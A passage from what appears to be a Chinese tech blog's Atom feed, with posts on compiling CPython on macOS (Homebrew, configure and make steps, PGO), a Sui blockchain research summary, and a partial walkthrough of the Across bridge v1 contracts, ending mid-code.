地址对应 mint 状态是否为 false；</p></li><li><p>调用 <code>mint</code>，传入合法的 Merkle 证明：</p><p><code>[&quot;0x1575cc1dded49f942913392f94716824d29b8fa45876b2db6295d16a606533a4&quot;,&quot;0x6c42c6099e51e28eef8f19f71765bb42c571d5c7177996f177606138f65c0c2b&quot;,&quot;0xb0d6f760008340e3f60414d84b305702faa6418f44f31de07b10e05bf369eb3b&quot;,&quot;0x4c880bf401add28c4e51270dfe16b28c3ca1b3d263ff7c5863fc8214b4046364&quot;]</code>，可以看到交易成功；</p></li><li><p>验证 <code>0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33</code> 地址对应 mint 状态是否为 <code>true</code>。</p></li></ol><p>。</p><h3><span id="can-kao-wen-zhang">参考文章</span></h3><ol><li><a href="https://medium.com/@ItsCuzzo/using-merkle-trees-for-nft-whitelists-523b58ada3f9">Using Merkle Trees for NFT Whitelists</a></li><li><a href="https://medium.com/@jgm.orinoco/understanding-merkle-pollards-1547fc7efaa">Understanding Merkle pollards</a></li><li><a href="https://litentry.medium.com/litentry-weekly-report-nft-pallet-and-merkle-airdrop-f0fe7a32a7da">Litentry this week: NFT pallet and Merkle airdrop</a></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      使用 Merkle 树做 NFT 白名单验证
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CPython Internals 笔记 ── 编译 Python</title>
    <link href="https://qiwihui.com/qiwihui-blog-149/"/>
    <id>https://qiwihui.com/qiwihui-blog-149/</id>
    <published>2024-05-15T02:25:31.362Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>现在你已经下载了 CPython 开发环境并对其进行了配置，你可以将 CPython 源代码编译成一个可执行的解释器。</p><p>与 Python 文件不同，C 源代码每次更改时都必须重新编译。</p><p>在前一章中，我们已经设置开发环境，并设置了运行“Build”阶段的选项，该选项将重新编译 CPython。在构建步骤工作之前，你需要一个 C 编译器和一些构建工具。使用的工具取决于你使用的操作系统。</p><span id="more"></span><blockquote><p>如果你担心这些步骤中的任何一个会干扰您现有的 CPython 安装，请不要担心。CPython 源目录的行为就像一个虚拟环境。</p><p>对于编译 CPython、修改源代码和标准库，这些都保留在源目录的沙箱中。</p><p>如果要安装自定义版本，本章也将介绍此步骤。</p></blockquote><h2><span id="zai-macos-xi-tong-shang-bian-yi-cpython">在 macOS 系统上编译 CPython</span></h2><p>在 macOS 上编译 CPython 需要一些额外的应用程序和库。你首先需要基本的 C 编译器工具包。“Command Line Development Tools” 是一个可以在 macOS 中通过 App Store 更新的应用程序。你需要在终端上执行初始安装。</p><p>在终端中，通过运行以下命令安装 C 编译器和工具包：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xcode-select --install</span><br></pre></td></tr></table></figure><p>该命令会弹出一个提示，提示下载并安装一组工具，包括 Git、Make 和 GNU C 编译器。</p><p>你还需要一份 <a href="https://www.openssl.org/">OpenSSL</a> 的工作副本，用于从 <a href="http://PyPi.org">PyPi.org</a> 网站获取包。如果你以后计划使用此构建版本来安装其他软件包，则需要进行 SSL 验证。</p><p>在 macOS 上安装 OpenSSL 的最简单方法是使用 <a href="https://brew.sh/">Homebrew</a>。</p><p>可以使用一下命令安装 Homebrew：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/ruby -e <span class="string">&quot;<span class="subst">$(curl -fsSL \</span></span></span><br><span class="line"><span class="subst"><span class="string"> https://raw.githubusercontent.com/Homebrew/install/master/install)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>一旦安装完成，你就可以使用 <code>brew install</code> 命令来安装所需的工具。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew install openssl xz zlib gdbm sqlite</span><br></pre></td></tr></table></figure><p>现在你已经安装了依赖项，你可以运行 <code>configure</code> 脚本。Homebrew 有一个命令 <code>brew --prefix [package]</code> ，它将给出安装包的目录。你将通过编译 Homebrew 使用的位置来启用对 SSL 的支持。</p><p>标志 <code>--with-pydebug</code> 启用调试挂钩。如果你打算出于开发或测试目的进行调试，请添加此项。</p><p>配置阶段只需要运行一次，同时指定 <code>zlib</code> 包的位置：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ CPPFLAGS=<span class="string">&quot;-I<span class="subst">$(brew --prefix zlib)</span>/include&quot;</span> \</span><br><span class="line"> LDFLAGS=<span class="string">&quot;-L<span class="subst">$(brew --prefix zlib)</span>/lib -L<span class="subst">$(brew --prefix bzip2)</span>/lib&quot;</span> \</span><br><span class="line"> ./configure --with-openssl=$(brew --prefix openssl) --with-pydebug</span><br></pre></td></tr></table></figure><p>运行 <code>configure</code> 将在存储库的根目录中生成一个 <code>Makefile</code>，你可以使用它来自动化构建过程。</p><p>你现在可以通过运行一下命令来构建 CPython 二进制文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make -j2 -s</span><br></pre></td></tr></table></figure><p>在构建过程中，你可能会收到一些错误。在构建摘要中，<code>make</code> 会通知你并非所有包都已构建。例如，<code>ossaudiodev</code>、<code>spwd</code> 和 <code>_tkinter</code> 将无法使用这组指令进行构建。如果你不打算针对这些软件包进行开发，那也没关系。如果是，请查看<a href="https://devguide.python.org/">官方开发指南</a>网站以获取更多信息。</p><p>构建将需要几分钟并生成一个名为 <code>python.exe</code> 的二进制文件。每次对源代码进行更改时，你都会需要使用相同的标志重新运行 <code>make</code>。<code>python.exe</code> 二进制文件是 CPython 的调试二进制文件。执行 <code>python.exe</code> 以查看有效的 REPL：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./python.exe</span><br><span class="line">Python 3.9.0b1 (tags/v3.9.0b1:97fe9cf, May 19 2020, 10:00:00)</span><br><span class="line">[Clang 10.0.1 (clang-1001.0.46.4)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>是的，没错，macOS 版本的文件扩展名为 <code>.exe</code>。 这个扩展<em>不是</em>因为它是 Windows 二进制文件！因为 macOS 有一个不区分大小写的文件系统，并且在使用二进制文件时，开发人员不希望人们不小心引用 <code>Python/</code> 目录，因此附加了 <code>.exe</code> 以避免歧义。如果你稍后运行 <code>make install</code> 或 <code>make altinstall</code>，它将在将文件安装到你的系统之前将文件重命名回 python。</p></blockquote><h2><span id="pei-zhi-wen-jian-yin-dao-you-hua">配置文件引导优化</span></h2><p>macOS、Linux 和 Windows 构建过程具有“PGO”或“Profile Guided Optimization”标志。PGO 不是 Python 团队创建的东西，而是许多编译器的特性，包括 CPython 使用的编译器。</p><p>PGO 的工作方式是进行初始编译，然后通过运行一系列测试来分析应用程序。然后分析创建的配置文件，编译器将对二进制文件进行更改以提高性能。</p><p>对于 CPython，分析阶段运行 <code>python -m test --pgo</code>，它执行在 <code>Lib/test/libregrtest/pgo.py</code> 中指定的回归测试。这些测试是专门选择的，因为它们使用常用的 C 扩展模块或类型。</p><blockquote><p>PGO 过程非常耗时，因此在整本书中，我将其排除在推荐步骤列表之外，以缩短编译时间。如果要将自定义编译版本的 CPython 分发到生产环境中，则应在 Linux 和 macOS 中使用 <code>--with-pgo</code> 标志运行 <code>./configure</code>，并在 Windows 上使用 <code>--pgo</code> 标志运行 <code>build.bat</code>。</p></blockquote><p>由于优化特定于执行配置文件的平台和架构，因此无法在操作系统或 CPU 架构之间共享 PGO 配置文件。<a href="http://python.org">python.org</a> 上的 CPython 发行版已经通过 PGO，所以如果你在编译的二进制文件上运行基准测试，它会比从 <a href="http://python.org">python.org</a> 下载的要慢。</p><p>Windows、macOS 和 Linux 配置文件引导的优化包括以下检查和改进：</p><ul><li><strong>函数内联</strong> ── 如果函数被另一个函数定期调用，那么它将被“内联”以减少堆栈大小。</li><li><strong>虚拟调用推测和内联</strong> ── 如果一个虚拟函数调用频繁地针对某个函数，PGO 可以插入一个有条件执行的对该函数的直接调用。然后可以内联直接调用。</li><li><strong>寄存器分配优化</strong> ── 基于配置文件数据结果，PGO 将优化寄存器分配。</li><li><strong>基本块优化</strong> ── 基本块优化允许在给定帧内临时执行的共同执行的基本块放置在同一组页面（局部性）中。它最大限度地减少了使用的页面数量，从而最大限度地减少了内存开销。</li><li><strong>热点优化</strong> ── 程序花费最多执行时间的函数可以优化速度。</li><li><strong>函数布局优化</strong> ── 在分析调用图之后，倾向于沿着相同执行路径的函数被移动到编译应用程序的同一部分。</li><li><strong>条件分支优化</strong> - PGO 可以查看决策分支，如 <code>if..else if</code> 或 <code>switch</code> 语句，并找出最常用的路径。例如，如果 <code>switch</code> 语句中有 10 个 <code>case</code>，其中一个使用了 95% 的时间，那么它会被移到顶部，以便在代码路径中立即执行。</li><li><strong>死点分离</strong> ── 在 PGO 期间未调用的代码被移动到应用程序的单独部分。</li></ul><h2><span id="jie-lun">结论</span></h2><p>在本章中，你已经了解了如何将 CPython 源代码编译成可工作的解释器。在探索和改编源代码时，你可以在整本书中使用这些知识。</p><p>在使用 CPython 时，你可能需要重复编译步骤数十次甚至数百次。如果你可以调整你的开发环境来创建重新编译的快捷方式，最好现在就这样做，这样可以节省大量时间。</p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CPython Internals 笔记 ── 编译 Python
    
    </summary>
    
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="读书笔记" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="CPythonInternals" scheme="https://qiwihui.com/tags/CPythonInternals/"/>
    
  </entry>
  
  <entry>
    <title>Sui 公链研究整理</title>
    <link href="https://qiwihui.com/qiwihui-blog-162/"/>
    <id>https://qiwihui.com/qiwihui-blog-162/</id>
    <published>2024-05-15T02:25:31.355Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>官网：<a href="https://sui.io/">https://sui.io/</a></p><p>白皮书：<a href="https://github.com/MystenLabs/sui/blob/main/doc/paper/sui.pdf">https://github.com/MystenLabs/sui/blob/main/doc/paper/sui.pdf</a></p><span id="more"></span><h2><span id="ji-zhu">技术</span></h2><p>水平可扩展性，高吞吐，低延迟。</p><p>技术特征：</p><ol><li>变体 Move 语言<ol><li>安全特性（内存安全，Move Prover）</li><li>编程范式：虽然大多数区块链的存储都以帐户为中心，但 Sui 的存储是围绕对象设计的。每个对象由一个地址所拥有，默认情况下可变，也可设为不可变或在多个地址之间共享。Sui 的 Move 智能合约可以接收这些对象作为输入，对其进行操作，并将对象作为输出返回。这是一种完全不同于 Solidity 或 Rust 的智能合约编程范式，更具表现力，对于动态NFT和加密游戏的数字对象表达更简单。</li><li>改善网络性能并简化开发人员体验</li><li>相较于Solidity，较少经历项目验证，缺少安全实践。</li></ol></li><li>交易并行化<ol><li>对于链上的大多数交易都不会与其他交易竞争相同的资源(例如对同一个NFT发起两笔交易)，按目前公链的设计（例如ETH），需要对一个总的排序交易列表来进行全节点的共识确认，因此造成了大量的计算浪费。</li><li>Sui不要求全序，只要满足因果关系的交易顺序执行即可，没有因果关系的交易可以被Sui的验证器以任意顺序执行。</li></ol></li><li>可扩展性<ol><li>因为不要求交易满足全序，只要求交易满足因果顺序。</li><li>使用 Narwhal 共识机制来全排序包含共享对象的交易</li><li>水平扩展，多机器分片，可以通过给验证节点增加设备来提升吞吐</li></ol></li><li>共识机制<ul><li>拜占庭式一致广播，用于独立的交易</li><li>BFT 共识（+基于 DAG 的 mempool），用于有依赖关系的交易（共享对象）</li><li>共识算法专注于尽量减少验证节点之间处理交易所需的通信。</li></ul></li></ol><h2><span id="token-jing-ji-xue">Token 经济学</span></h2><h3><span id="gai-kuang">概况</span></h3><p>代币经济白皮书：<a href="https://github.com/MystenLabs/sui/blob/main/doc/paper/tokenomics.pdf">The Sui Smart Contracts Platform: Economics and Incentives</a></p><p>代币：SUI</p><p>总供应量： 100亿，分配给创始团队、投资者、公售、Sui 基金会和未来的释放。</p><p>代币作用：</p><ul><li>质押/保护网络</li><li>交易费</li><li>治理</li><li>账户单位/交易中介</li></ul><p>角色：</p><ul><li>用户：使用 Sui 平台进行交易，以创建，修改和转移数字资产或与基于智能合约，互操作性，可组合性的复杂应用进行交互；</li><li>SUI代币持有者：可选择将其代币委托给验证者并参与权益证明机制（POS）。SUI 所有者也拥有参与 Sui 治理的权利</li><li>验证者：进行 Sui 公链上的事务处理和执行</li></ul><p>五个核心组件：</p><ul><li>SUI 代币是 Sui 平台的原生资产。</li><li>所有网络操作都收取 Gas 费，用于奖励权益证明机制的参与者，防止垃圾信息和拒绝服务攻击。</li><li>Sui 的存储基金用于跨时间转移权益奖励，并补偿未来验证者先前存储的链上数据的存储成本。</li><li>权益证明机制 PoS 用于选择、激励和奖励 Sui 平台操作者（即验证者和 SUI 委托人）的诚实行为。</li><li>链上投票用于治理和协议升级。</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/181870355-c7269c0d-7969-4ea9-a3c3-9610c2238a63.png" alt="sui-token-economics"></p><h3><span id="gas-ding-jie-mo-xing">Gas定价模型</span></h3><p>为用户提供<strong>可预测</strong>的<strong>低的</strong>交易费用、激励验证者优化其交易处理操作以及防止拒绝服务攻击。</p><p>Gas 费用包含两个部分：计算执行费用和存储费用，并为两部分费用分别计价。</p><p>计算价格定价机制：</p><ul><li>Sui 以纪元为单位运行，每个纪元（24 小时）验证节点集都会改变。新纪元的验证节点会就整个纪元的参考 Gas 费进行投票。该协议会提供一些激励措施，鼓励验证节点在整个纪元将交易费用保持在接近参考价格的水平。具体过程为：<ol><li>在每个纪元开始时，需要每个验证者提交一个 gas 报价（即每个验证者愿意处理交易的最低gas价格)，Sui将会把总gas报价列表中2/3位置处的价格设置为这个纪元的参考gas价格，例如总共有 100 个验证者者提供了 gas 报价，将所有的 gas 报价进行低到高排序，其中第 67 位验证者提供的 gas 报价即为本纪元的参考 gas 价格</li><li>在用户提交交易时，可按参考 gas 价格进行 gas 价格设置，但由于每个用户习惯不一致和链上网络的波动情况，因此最终实际的 gas 价格会与参考 gas 价格有一点的出入。</li><li>在每个纪元结束时，会根据每个验证者执行的实际 gas 价格情况进行奖励的分配，在纪元开始时提交低价报价（即低于参考价格）或处理实际 gas 价格高于其 gas 报价交易的验证者会获得更高的奖励。相反，在纪元开始时提交高价报价（即高于参考价格）或处理实际 gas 价格低于其 gas 报价的验证者将受到奖励减少的惩罚。</li></ol></li><li>通过这套机制，一是鼓励验证者降低其 gas 价格的报价，二是让用户有一个参考价格供其参考，保证用户设置接近参考价格的 gas 的交易能够得到及时的处理。</li></ul><p>存储价格：</p><ul><li>通过治理提案设置，并不经常更新。目的是通过将这些费用存入存储基金，然后将这些费用重新分配给未来的验证者，确保 Sui 用户为其使用链上数据存储付费。 与计算 gas 价格相比，存储价格是固定的，并且对于一个纪元内和跨纪元的所有交易都是通用的，直到存储价格更新。</li></ul><p>网络堵塞期间 Gas 费如何保持在低位：因为网络的吞吐量与更多的参与者成线性关系，验证节点可以根据网络需求的增加按比例增加更多的参与者，以此使 Gas 价格接近参考价格。</p><p>存储基金：</p><ul><li>解决状态通胀（state bloat）问题</li><li>Sui 的一个关键特性是它能够处理任意数量的链上数据，但却需要足够多的存储资源来进行支持。因此用户在进行每笔交易时，在当下即支付了一笔存储费用到存储基金，存储基金将会使用这笔资金来奖励未来的验证者，因为未来的验证者也为当下用户数据的存储付出了成本（即验证者需要存储全账本）。当链上存储要求很高时，验证者会获得大量额外奖励以补偿其成本。当存储要求较低时，反之亦然。</li><li>从长远来看，随着技术改进导致存储成本下降和 SUI 代币价格的变化，治理提案将更新存储 gas 价格以反映其新的目标价格。</li><li>Sui 的存储模型包括一个“删除选项”，用户在删除之前存储的链上数据（例如 NFT 的元数据）时，可以通过该选项获得存储费回扣（即从之前支付的存储 gas 中返回一笔资金，因为自己的数据无需再进行存储）。</li></ul><h3><span id="pos-wei-tuo-mo-xing">PoS 委托模型</span></h3><p>SUI 持有者可以将自己的 SUI 委托给给验证者进行质押，在每个纪元结束时可获取对应份额的奖励。</p><p>验证者在总质押奖励中的份额是与质押数量相关的，因为它决定了每个验证者在处理交易中的投票权份额。每笔Sui的交易只需要2/3的验证者按权益份额进行处理，因此拥有质押数量越多的验证者将拥有更多的份额，从而处理更多的交易，获取到更多的奖励。同时在计算总奖励时，Sui 也会对存储基金进行分配，因此验证者就会相对于 SUI 委托人获得更多的质押奖励。</p><p>同时在每个纪元开始前，SUI 持有者可自由地选择验证者进行 SUI 的质押，因此对于处理速度快的验证者将处理更多的交易，获取到更多的执行 gas 奖励，持有者也更愿意选择这种验证者进行质押，从而提升了整个 Sui 网络验证者的质量。</p><h2><span id="tuan-dui-qing-kuang">团队情况</span></h2><h3><span id="gai-kuang">概况</span></h3><ul><li>开发团队：Mysten Labs</li><li>创始人包括 <a href="https://twitter.com/EvanWeb3">Evan Cheng</a>、<a href="https://twitter.com/EmanAbio">Adeniyi Abiodun</a>、<a href="https://twitter.com/b1ackd0g">Sam Blackshear</a>、<a href="https://twitter.com/GDanezis">George Danezis</a>、<a href="https://twitter.com/kostascrypto">Kostas Kryptos</a>，均在 Meta 参与过 Novi 和 Diem 项目</li></ul><h3><span id="rong-zi">融资</span></h3><ul><li>Mysten Labs 于 2021 年 12 月宣布完成 3600 万美元 A 轮融资，该轮融资由 a16z 领投，Coinbase Ventures、NFX、Slow Ventures、Scribble Ventures、Samsung NEXT、Lux Capital 等参投。</li><li>正在寻求以 20 亿美元估值筹集至少 2 亿美元 B 轮融资，本轮融资由 FTX Ventures 领投，目前项目方已在该轮融资中获得 1.4 亿美元资金支持。</li></ul><h2><span id="sheng-tai-jian-she">生态建设</span></h2><ol><li>团队构想的公链 4 个关键应用：游戏、DeFi、商业和社交。所有 4 个应用都将充分利用 Sui 的高吞吐量和低延迟来提供最佳用户体验。游戏和社交应用在 Sui 上构建还具有独特的优势。游戏可以利用 Move 针对数字形象的安全性和表现力。社交媒体应用可以利用 Sui 的数据存储经济学将所有数据直接存储在链上。</li><li>Sui Monstars，游戏。</li></ol><h2><span id="feng-xian-dian">风险点</span></h2><ol><li>公链生态的构建是一个漫长的过程。</li><li>掌握全网质押总量的2/3即可控制整个网络,若是有验证者和Web2大公司一样发起质押补贴，例如将本属于自己的执行 gas 和存储 gas 也发放给将 SUI 质押在自己这里的 SUI 持有者，则会吸引大量的 SUI 持有者将自己的 SUI 质押在这样的验证者节点上，从而让这个验证者掌握了整个网络的控制权，从而具备了作恶的能力。一旦开始作恶，则可能使整个网络的其他参与者的利益受损。</li><li>Move 语言做为新兴合约语言，在学习成本，安全/审计，开发工具完备成都，成熟的合约组件等，都与Solidity有一定的距离。</li></ol><h2><span id="can-kao">参考</span></h2><ol><li><a href="https://www.theblockbeats.info/news/31206">新公链Sui：估值20亿美元的前Facebook团队打造的Layer1</a></li><li><a href="https://twitter.com/linda_guagua/status/1549031224555237378?s=20&amp;t=d6yTDgKMK6KJNaR2qkoKVA">Linda_郑郑的thread</a></li><li><a href="https://www.youtube.com/watch?v=bTiyATYCU20">Sui—前facebook团队和顶级机构创建的新一代区块链公链【Vic TALK 第263期】</a></li><li><a href="https://cryptohot.substack.com/p/-sui-">https://cryptohot.substack.com/p/-sui-</a></li><li><a href="https://twitter.com/mindaoyang/status/1552384026383904768">https://twitter.com/mindaoyang/status/1552384026383904768</a></li><li><a href="https://twitter.com/tracecrypto1/status/1544332560389607424">https://twitter.com/tracecrypto1/status/1544332560389607424</a></li><li><a href="https://twitter.com/cryptoalvatar/status/1551878534926401537">https://twitter.com/cryptoalvatar/status/1551878534926401537</a></li><li><a href="https://twitter.com/state_xyz/status/1551878856151142401">https://twitter.com/state_xyz/status/1551878856151142401</a></li></ol><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Sui 公链研究整理
    
    </summary>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="投研" scheme="https://qiwihui.com/tags/%E6%8A%95%E7%A0%94/"/>
    
  </entry>
  
  <entry>
    <title>Across 跨链桥合约解析</title>
    <link href="https://qiwihui.com/qiwihui-blog-158/"/>
    <id>https://qiwihui.com/qiwihui-blog-158/</id>
    <published>2024-05-15T02:25:31.353Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="shi-me-shi-across">什么是 Across</span></h2><p>以太坊跨链协议 <a href="https://across.to/">Across</a> 是一种新颖的跨链方法，它结合了乐观预言机（Optimistic Oracle）、绑定中继者和单边流动性池，可以提供从 Rollup 链到以太坊主网的去中心化即时交易。目前，Across 协议通过集成以太坊二层扩容方案Optimism、Arbitrum和Boba Network支持双向桥接，即可将资产从L1发送至L2，亦可从L2发送至L1。</p><span id="more"></span><h3><span id="cun-kuan-kua-lian-liu-cheng">存款跨链流程</span></h3><p><img src="https://user-images.githubusercontent.com/3297411/158982132-cd917c98-e156-45d4-b50b-0256f222db32.png" alt="process"></p><p>来源于：<a href="https://docs.across.to/bridge/how-does-across-work-1/architecture-process-walkthrough">https://docs.across.to/bridge/how-does-across-work-1/architecture-process-walkthrough</a></p><p>Across 协议中，存款跨链有几种可能的流程，最重要的是，存款人在任何这些情况下都不会损失资金。在每一种情况下，在 L2 上存入的任何代币都会通过 Optimism 或 Arbitrum 的原生桥转移到 L1 上的流动池，用以偿还给流动性提供者。</p><p>从上面的流程中，我们可以看到 Across 协议流程包括以下几种：</p><ul><li>即时中继，无争议；</li><li>即时中继，有争议；</li><li>慢速中继，无争议；</li><li>慢速中继，有争议；</li><li>慢速中继，加速为即时中继。</li></ul><p>Across 协议中主要包括几类角色：</p><ul><li>存款者（Depositor）：需要将资产从二层链转移到L1的用户；</li><li>中继者（Relayer）：负责将L1层资产转移给用户，以及L2层资产跨链的节点；</li><li>流动性提供者（LP）：为流动性池提供资产；</li><li>争议者（Disputor）：对中继过程有争议的人，可以向 Optimistic Oracle 提交争议；</li></ul><h2><span id="xiang-mu-zong-lan">项目总览</span></h2><p>Across 的合约源码地址为 <a href="https://github.com/across-protocol/contracts-v1%EF%BC%8C%E7%9B%AE%E5%89%8D">https://github.com/across-protocol/contracts-v1，目前</a> Across Protocol 正在进行 v2 版本合约的开发，我们这一篇文章主要分析 v1 版本的合约源码。首先我们下载源码：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/across-protocol/contracts-v1</span><br><span class="line"><span class="built_in">cd</span> contracts-v1</span><br></pre></td></tr></table></figure><p>合约源码的主要的目录结构为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">contract-v1</span><br><span class="line">├── contracts // Across protocol 的合约源码</span><br><span class="line">├── deploy // 部署脚本</span><br><span class="line">├── hardhat.config.js // hardhat 配置</span><br><span class="line">├── helpers // 辅助函数</span><br><span class="line">├── networks // 合约在不同链上的部署地址</span><br><span class="line">└── package.json // 依赖包</span><br></pre></td></tr></table></figure><p>在这篇解析中，我们主要关注 <code>contracts</code> 和 <code>deploy</code> 目录下的文件。</p><h3><span id="he-yue-zong-lan">合约总览</span></h3><p>合约目录 <code>contracts</code> 的目录结构为：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">contracts/</span><br><span class="line">├── common</span><br><span class="line">│   ├── implementation</span><br><span class="line">│   └── interfaces</span><br><span class="line">├── external</span><br><span class="line">│   ├── README.md</span><br><span class="line">│   ├── avm</span><br><span class="line">│   ├── chainbridge</span><br><span class="line">│   ├── ovm</span><br><span class="line">│   └── polygon</span><br><span class="line">├── insured-bridge</span><br><span class="line">│   ├── BridgeAdmin.sol</span><br><span class="line">│   ├── BridgeDepositBox.sol</span><br><span class="line">│   ├── BridgePool.sol</span><br><span class="line">│   ├── RateModelStore.sol</span><br><span class="line">│   ├── avm</span><br><span class="line">│   ├── interfaces</span><br><span class="line">│   ├── ovm</span><br><span class="line">│   └── <span class="built_in">test</span></span><br><span class="line">└── oracle</span><br><span class="line">    ├── implementation</span><br><span class="line">    └── interfaces</span><br></pre></td></tr></table></figure><p>其中，各个目录包含的内容为：</p><ul><li><code>common</code>：一些通用功能的库方法等，包括：<ul><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/AncillaryData.sol">AncillaryData.sol</a>：用来编码和解码 DVM价格请求的数据的库；</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/FixedPoint.sol">FixedPoint.sol</a>：定点数运算；</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/Lockable.sol">Lockable.sol</a>：防止重入攻击的一些函数修改器；</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/MultiCaller.sol">MultiCaller.sol</a> ：可以在当个调用中调用合约的多个方法；</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/Testable.sol">Testable.sol</a>：测试时修改时间；</li><li><a href="https://github.com/across-protocol/contracts-v1/blob/master/contracts/common/implementation/Timer.sol">Timer.sol</a>：获取时间方法；</li></ul></li><li><code>external</code>：外部合约，主要用于实现在管理员合约中对不同 L2 的消息发送；</li><li><code>insured-bridge</code> 合约主要功能，我们会在接下来的章节章节中重点分析；</li><li><code>oracle</code>：主要是 Optimistic Oracle 提供功能的方法接口，在这篇文章中我们不对 Optimistic Oracle 的原理实现进行介绍，主要会介绍 Across 协议会在何处使用 Optimistic Oracle。</li></ul><p>接下来我们会重点分析 <code>insured-bridge</code> 中的合约的功能，这是 Across 主要功能的合约所在。</p><p>在 <code>insured-bridge</code> 目录中：</p><ul><li><code>BridgeAdmin.sol</code> ：管理合约，负责管理和生成生成 L2 上的 DepositBox 合约和 L1 上的 BridgePool 合约；</li><li><code>BridgeDepositBox.sol</code> ：L2 层上负责存款的抽象合约，Arbitrum，Optimism 和 Boba 网络的合约都是继承自这个合约；</li><li><code>BridgePool.sol</code> ：桥接池合约，管理 L1 层资金池。</li></ul><h2><span id="bridgeadmin">BridgeAdmin</span></h2><p>这个合约是管理员合约，部署在L1层，并有权限管理 L1 层上的流动性池和 L2 上的存款箱（DepositBoxes）。可以注意的是，这个合约的管理帐号是一个多钱钱包，避免了一些安全问题。</p><p>首先我们看到合约中的几个状态变量：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract BridgeAdmin is BridgeAdminInterface, Ownable, Lockable &#123;</span><br><span class="line"></span><br><span class="line">    address public override finder;</span><br><span class="line"></span><br><span class="line">    mapping(uint256 =&gt; DepositUtilityContracts) private _depositContracts;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; L1TokenRelationships) private _whitelistedTokens;</span><br><span class="line"></span><br><span class="line">    // Set upon construction and can be reset by Owner.</span><br><span class="line">    uint32 public override optimisticOracleLiveness;</span><br><span class="line">    uint64 public override proposerBondPct;</span><br><span class="line">    bytes32 public override identifier;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _finder,</span><br><span class="line">        uint32 _optimisticOracleLiveness,</span><br><span class="line">        uint64 _proposerBondPct,</span><br><span class="line">        bytes32 _identifier</span><br><span class="line">    ) &#123;</span><br><span class="line">        finder = _finder;</span><br><span class="line">        require(address(_getCollateralWhitelist()) != address(0), &quot;Invalid finder&quot;);</span><br><span class="line">        _setOptimisticOracleLiveness(_optimisticOracleLiveness);</span><br><span class="line">        _setProposerBondPct(_proposerBondPct);</span><br><span class="line">        _setIdentifier(_identifier);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>finder</code> 用来记录查询最新 OptimisticOracle 和 UMA 生态中其他合约的合约地址；</li><li><code>_depositContracts</code> 该合约可以将消息中继到任意数量的 L2 存款箱，每个 L2 网络一个，每个都由唯一的网络 ID 标识。 要中继消息，需要存储存款箱合约地址和信使（messenger）合约地址。 每个 L2 的信使实现不同，因为 L1 --&gt; L2 消息传递是非标准的；</li><li><code>_whitelistedTokens</code> 记录了 L1 代币地址与对应 L2 代币地址以及桥接池的映射；</li><li><code>optimisticOracleLiveness</code> 中继存款的争议时长；</li><li><code>proposerBondPct</code> Optimistic Oracle 中 proposer 的绑定费率</li></ul><p>管理员可以设置以上这些变量的内容，以及可以设置每秒的 LP 费率，转移桥接池的管理员权限等。</p><p>同时，管理员还可以通过信使设置 L2 层合约的参数，包括；</p><ul><li><code>setCrossDomainAdmin</code> ：设置 L2 存款合约的管理员地址；</li><li><code>setMinimumBridgingDelay</code> ：设置 L2 存款合约的最小桥接延迟；</li><li><code>setEnableDepositsAndRelays</code>：开启或者暂停代币 L2 存款，这个方法会同时暂停 L1 层桥接池；</li><li><code>whitelistToken</code>：关联 L2 代币地址，这样这个代币就可以开始存款和中继；</li></ul><p>对于消息发送，管理员合约通过调用不同的信使的 <code>relayMessage</code> 方法来完成，将 msg.value == l1CallValue 发送给信使，然后它可以以任何方式使用它来执行跨域消息。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _relayMessage(</span><br><span class="line">    address 